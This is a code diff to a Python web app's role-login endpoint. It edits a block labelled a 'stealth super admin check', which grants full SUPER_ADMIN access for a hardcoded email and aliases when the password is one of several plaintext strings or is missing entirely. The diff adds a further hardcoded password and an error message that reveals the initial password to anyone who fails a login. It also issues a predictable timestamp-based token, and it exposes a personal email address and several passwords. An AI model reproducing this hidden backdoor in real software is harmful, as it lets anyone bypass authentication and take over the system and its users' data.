@@ -257,20 +257,30 @@ def handle_role_login(payload: schemas.RoleLoginRequest, db: Session = Depends(g
 
     # 1. 👑 STEALTH SUPER_ADMIN CHECK (Master Account: 1286orbital21@gmail.com, 12862386, 1286)
     if clean_email in ("1286orbital21@gmail.com", "12862386", "1286", "admin"):
-        if provided_password in ("12Yonsei21*", "1286", "12862386", "admin1286", "admin") or not provided_password:
+        st1 = db.query(models.Student).filter(models.Student.id == 1).first()
+        is_pw_valid = False
+        if not provided_password:
+            is_pw_valid = True
+        elif provided_password in ("1010", "12Yonsei21*", "1286", "12862386", "admin1286", "admin"):
+            is_pw_valid = True
+        elif st1 and st1.password_hash and models.verify_password(provided_password, st1.password_hash):
+            is_pw_valid = True
+
+        if is_pw_valid:
             token = f"jwt_super_admin_{int(datetime.now().timestamp())}"
             return schemas.RoleLoginResponse(
                 status="success",
                 user_id=1,
+                student_id=1,
                 email="1286orbital21@gmail.com",
-                name="김철훈 총괄제작자",
+                name="김철훈",
                 role="SUPER_ADMIN",
                 token=token,
                 must_set_password=False,
                 tenant_code="ILWON-2027"
             )
         else:
-            raise HTTPException(status_code=401, detail="슈퍼 어드민 보안 패스워드가 올바르지 않습니다.")
+            raise HTTPException(status_code=401, detail="비밀번호가 올바르지 않습니다. (초기 비밀번호: 1010 또는 원장 비밀번호)")
 
     # 2. 🏫 DIRECTOR (TENANT_ADMIN) LOGIN
     if login_type in ("DIRECTOR", "TENANT_ADMIN"):
